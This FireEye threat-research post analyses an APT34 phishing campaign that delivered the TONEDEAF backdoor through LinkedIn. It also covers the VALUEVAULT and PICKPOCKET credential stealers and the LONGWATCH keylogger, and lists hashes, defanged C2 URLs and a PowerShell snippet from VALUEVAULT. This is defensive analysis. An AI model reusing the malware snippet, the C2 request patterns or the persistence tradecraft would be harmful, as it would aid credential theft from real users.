Hard Pass: Declining APT34’s Invite to Join Their
Professional Network
ﬁreeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professionalnetwork.html

Background
With increasing geopolitical tensions in the Middle East, we expect Iran to signiﬁcantly
increase the volume and scope of its cyber espionage campaigns. Iran has a critical
need for strategic intelligence and is likely to ﬁll this gap by conducting espionage
against decision makers and key organizations that may have information that furthers
Iran's economic and national security goals. The identiﬁcation of new malware and the
creation of additional infrastructure to enable such campaigns highlights the increased
tempo of these operations in support of Iranian interests.

FireEye Identiﬁes Phishing Campaign
In late June 2019, FireEye identiﬁed a phishing campaign conducted by APT34, an
Iranian-nexus threat actor. Three key attributes caught our eye with this particular
campaign:
1. Masquerading as a member of Cambridge University to gain victims’ trust to open
malicious documents,
2. The usage of LinkedIn to deliver malicious documents,
3. The addition of three new malware families to APT34’s arsenal.
FireEye’s platform successfully thwarted this attempted intrusion, stopping a new
malware variant dead in its tracks. Additionally, with the assistance of our FireEye Labs
Advanced Reverse Engineering (FLARE), Intelligence, and Advanced Practices teams,
we identiﬁed three new malware families and a reappearance of PICKPOCKET, malware
exclusively observed in use by APT34. The new malware families, which we will
examine later in this post, show APT34 relying on their PowerShell development
capabilities, as well as trying their hand at Golang.
APT34 is an Iran-nexus cluster of cyber espionage activity that has been active since at
least 2014. They use a mix of public and non-public tools to collect strategic information
that would beneﬁt nation-state interests pertaining to geopolitical and economic needs.
APT34 aligns with elements of activity reported as OilRig and Greenbug, by various
security researchers. This threat group has conducted broad targeting across a variety of
industries operating in the Middle East; however, we believe APT34's strongest interest
is gaining access to ﬁnancial, energy, and government entities.
Additional research on APT34 can be found in this FireEye blog post, this CERT-OPMD
post, and this Cisco post.

Managed Defense also initiated a Community Protection Event (CPE) titled “Geopolitical
Spotlight: Iran.” This CPE was created to ensure our customers are updated with new
discoveries, activity and detection efforts related to this campaign, along with other
recent activity from Iranian-nexus threat actors to include APT33, which is mentioned in
this updated FireEye blog post.

Industries Targeted
The activities observed by Managed Defense, and described in this post, were primarily
targeting the following industries:
Energy and Utilities
Government
Oil and Gas

Utilizing Cambridge University to Establish Trust
On June 19, 2019, FireEye’s Managed Defense Security Operations Center received an
exploit detection alert on one of our FireEye Endpoint Security appliances. The offending
application was identiﬁed as Microsoft Excel and was stopped immediately by FireEye
Endpoint Security’s ExploitGuard engine. ExploitGuard is our behavioral monitoring,
detection, and prevention capability that monitors application behavior, looking for
various anomalies that threat actors use to subvert traditional detection mechanisms.
Offending applications can subsequently be sandboxed or terminated, preventing an
exploit from reaching its next programmed step.
The Managed Defense SOC analyzed the alert and identiﬁed a malicious ﬁle named
System.doc (MD5: b338baa673ac007d7af54075ea69660b), located in C:\Users\
<user_name>\.templates. The ﬁle System.doc is a Windows Portable Executable (PE),
despite having a "doc" ﬁle extension. FireEye identiﬁed this new malware family as
TONEDEAF.
A backdoor that communicates with a single command and control (C2) server using
HTTP GET and POST requests, TONEDEAF supports collecting system information,
uploading and downloading of ﬁles, and arbitrary shell command execution. When
executed, this variant of TONEDEAF wrote encrypted data to two temporary ﬁles –
temp.txt and temp2.txt – within the same directory of its execution. We explore additional
technical details of TONEDEAF in the malware appendix of this post.
Retracing the steps preceding exploit detection, FireEye identiﬁed that System.doc was
dropped by a ﬁle named ERFT-Details.xls. Combining endpoint- and network-visibility,
we were able to correlate that ERFT-Details.xls originated from the URL http://www.camresearch-ac[.]com/Documents/ERFT-Details.xls. Network evidence also showed the
access of a LinkedIn message directly preceding the spreadsheet download.
Managed Defense reached out to the impacted customer’s security team, who conﬁrmed
the ﬁle was received via a LinkedIn message. The targeted employee conversed with
"Rebecca Watts", allegedly employed as "Research Staff at University of Cambridge".

The conversation with Ms. Watts, provided in Figure 1, began with the solicitation of
resumes for potential job opportunities.

Figure 1: Screenshot of LinkedIn message asking to download TONEDEAF
This is not the ﬁrst time we’ve seen APT34 utilize academia and/or job offer
conversations in their various campaigns. These conversations often take place on
social media platforms, which can be an effective delivery mechanism if a targeted
organization is focusing heavily on e-mail defenses to prevent intrusions.
FireEye examined the original ﬁle ERFT-Details.xls, which was observed with at least
two unique MD5 ﬁle hashes:
96feed478c347d4b95a8224de26a1b2c
caf418cbf6a9c4e93e79d4714d5d3b87
A snippet of the VBA code, provided in Figure 2, creates System.doc in the target
directory from base64-encoded text upon opening.

The spreadsheet also creates a scheduled task named "windows update check" that
runs the ﬁle C:\Users\<user_name>\.templates\System Manager.exe every minute. Upon
closing the spreadsheet, a ﬁnal VBA function will rename System.doc to System
Manager.exe. Figure 3 provides a snippet of VBA code that creates the scheduled task,
clearly obfuscated to avoid simple detection.

Upon ﬁrst execution of TONEDEAF, FireEye identiﬁed a callback to the C2 server
ofﬂineearthquake[.]com over port 80.

After identifying the usage of ofﬂineearthquake[.]com as a potential C2 domain,
FireEye’s Intelligence and Advanced Practices teams performed a wider search across
our global visibility. FireEye’s Advanced Practices and Intelligence teams were able to
identify additional artifacts and activity from the APT34 actors at other victim
organizations. Of note, FireEye discovered two additional new malware families hosted
at this domain, VALUEVAULT and LONGWATCH. We also identiﬁed a variant of
PICKPOCKET, a browser credential-theft tool FireEye has been tracking since May
2018, hosted on the C2.
Requests to the domain ofﬂineearthquake[.]com could take multiple forms, depending on
the malware’s stage of installation and purpose. Additionally, during installation, the
malware retrieves the system and current user names, which are used to create a threecharacter “sys_id”. This value is used in subsequent requests, likely to track infected
target activity. URLs were observed with the following structures:
hxxp[://]ofﬂineearthquake[.]com/download?id=<sys_id>&n=000
hxxp[://]ofﬂineearthquake[.]com/upload?id=<sys_id>&n=000
hxxp[://]ofﬂineearthquake[.]com/ﬁle/<sys_id>/<executable>?id=<cmd_id>&h=000
hxxp[://]ofﬂineearthquake[.]com/ﬁle/<sys_id>/<executable>?id=<cmd_id>&n=000
The ﬁrst executable identiﬁed by FireEye on the C2 was WinNTProgram.exe (MD5:
021a0f57fe09116a43c27e5133a57a0a), identiﬁed by FireEye as LONGWATCH.
LONGWATCH is a keylogger that outputs keystrokes to a log.txt ﬁle in the Window’s
temp folder. Further information regarding LONGWATCH is detailed in the Malware
Appendix section at the end of the post.
FireEye Network Security appliances also detected the following being retrieved from
APT34 infrastructure (Figure 4).
GET hxxp://ofﬂineearthquake.com/ﬁle/<sys_id>/b.exe?id=<3char_redacted>&n=000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)
AppleWebKit/537.36 (KHTML, like Gecko)
Host: ofﬂineearthquake[.]com
Proxy-Connection: Keep-Alive Pragma: no-cache HTTP/1.1

Security appliance
FireEye identiﬁes b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT.
VALUEVAULT is a Golang compiled version of the "Windows Vault Password Dumper"
browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.
VALUEVAULT maintains the same functionality as the original tool by allowing the
operator to extract and view the credentials stored in the Windows Vault. Additionally,
VALUEVAULT will call Windows PowerShell to extract browser history in order to match
browser passwords with visited sites. Further information regarding VALUEVAULT can
be found in the appendix below.

Further pivoting from FireEye appliances and internal data sources yielded two
additional ﬁles, PE86.dll (MD5: d8abe843db508048b4d4db748f92a103) and PE64.dll
(MD5: 6eca9c2b7cf12c247032aae28419319e). These ﬁles were analyzed and
determined to be 64- and 32-bit variants of the malware PICKPOCKET, respectively.
PICKPOCKET is a credential theft tool that dumps the user's website login credentials
from Chrome, Firefox, and Internet Explorer to a ﬁle. This tool was previously observed
during a Mandiant incident response in 2018 and, to date, solely utilized by APT34.

Conclusion
The activity described in this blog post presented a well-known Iranian threat actor
utilizing their tried-and-true techniques to breach targeted organizations. Luckily, with
FireEye’s platform in place, our Managed Defense customers were not impacted.
Furthermore, upon the blocking of this activity, FireEye was able to expand upon the
observed indicators to identify a broader campaign, as well as the use of new and old
malware.
We suspect this will not be the last time APT34 brings new tools to the table. Threat
actors are often reshaping their TTPs to evade detection mechanisms, especially if the
target is highly desired. For these reasons, we recommend organizations remain vigilant
in their defenses, and remember to view their environment holistically when it comes to
information security.

Malware Appendix
TONEDEAF
TONEDEAF is a backdoor that communicates with Command and Control servers using
HTTP or DNS. Supported commands include system information collection, ﬁle upload,
ﬁle download, and arbitrary shell command execution. Although this backdoor was
coded to be able to communicate with DNS requests to the hard-coded Command and
Control server, c[.]cdn-edge-akamai[.]com, it was not conﬁgured to use this functionality.
Figure 5 provides a snippet of the assembly CALL instruction of dns_exﬁl. The creator
likely made this as a means for future DNS exﬁltration as a plan B.

Figure 5: Snippet of code from TONEDEAF binary
Aside from not being enabled in this sample, the DNS tunneling functionality also
contains missing values and bugs that prevent it from executing properly. One such bug
involves determining the length of a command response string without accounting for
Unicode strings. As a result, a single command response byte is sent when, for example,
the malware executes a shell command that returns Unicode output. Additionally, within
the malware, an unused string contained the address 185[.]15[.]247[.]154.

VALUEVAULT
VALUEVAULT is a Golang compiled version of the “Windows Vault Password Dumper”
browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.
VALUEVAULT maintains the same functionality as the original tool by allowing the
operator to extract and view the credentials stored in the Windows Vault. Additionally,
VALUEVAULT will call Windows PowerShell to extract browser history in order to match
browser passwords with visited sites. A snippet of this function is shown in Figure 6.
powershell.exe /c "function get-iehistory {. [CmdletBinding()]. param (). . $shell = New-Ob‐
ject -ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. .
$hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items()
| . foreach {. $site = $_. . if ($site.IsFolder) {. $pageFolder = $site.GetFolder. $pageFold‐
er.Items() | . foreach {. $visit = New-Object -TypeName PSObject -Property @{ . URL =
$($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }. }. }. get-iehistory

Figure 6: Snippet of PowerShell code from VALUEVAULT to extract browser credentials
Upon execution, VALUEVAULT creates a SQLITE database ﬁle in the AppData\Roaming
directory under the context of the user account it was executed by. This ﬁle is named
fsociety.dat and VALUEVAULT will write the dumped passwords to this in SQL format.
This functionality is not in the original version of the “Windows Vault Password Dumper”.
Figure 7 shows the SQL format of the fsociety.dat ﬁle.

VALUEVAULT’s function names are not obfuscated and are directly reviewable in strings
analysis. Other developer environment variables were directly available within the binary
as shown below. VALUEVAULT does not possess the ability to perform network
communication, meaning the operators would need to manually retrieve the captured
output of the tool.

LONGWATCH
FireEye identiﬁed the binary WinNTProgram.exe
(MD5:021a0f57fe09116a43c27e5133a57a0a) hosted on the malicious domain
ofﬂineearthquake[.]com. FireEye identiﬁes this malware as LONGWATCH. The primary
function of LONGWATCH is a keylogger that outputs keystrokes to a log.txt ﬁle in the
Windows temp folder.
Interesting strings identiﬁed in the binary are shown in Figure 9.
